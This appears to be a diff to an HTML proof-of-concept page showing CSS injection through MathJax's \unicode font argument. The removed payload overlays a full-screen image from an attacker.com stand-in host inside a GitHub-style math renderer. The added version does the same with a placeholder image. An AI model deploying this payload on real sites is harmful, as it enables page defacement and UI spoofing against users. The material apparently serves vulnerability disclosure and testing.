@@ -3,12 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <title>MathJax CSS Injection PoC</title>
+    <!-- Load MathJax library -->
     <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+    <style>
+        /* Style to show the effect clearly */
+        body {
+            margin: 0;
+            height: 100vh;
+            overflow: hidden;
+        }
+    </style>
 </head>
 <body>
-    <p>Malicious MathJax rendering with CSS Injection:</p>
-    <math-renderer class="js-display-math" style="display: block" data-static-url="https://github.githubassets.com/static" data-run-id="5287bd6428aa015df40f3018f5f9dcc0">
-        $$\unicode[goombafont; color:red; pointer-events: none; z-index: 5; position: fixed; inset: 0; opacity: 100%; background-size: 100% 100%; background-image: url('https://attacker.com/malicious-image.png');]{x0000}$$
-    </math-renderer>
+    <p>Demonstrating CSS Injection via MathJax:</p>
+    <div id="mathjax-container">
+        $$\unicode[STIXGeneral; color:red; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999; background-image: url('https://via.placeholder.com/150/FF0000/FFFFFF?text=Injected+Image');]{x0000}$$
+    </div>
+
+    <script>
+        // Render the MathJax content
+        MathJax.typesetPromise().then(() => {
+            console.log('MathJax rendering complete');
+        }).catch((err) => console.log('MathJax rendering error:', err));
+    </script>
 </body>
 </html>
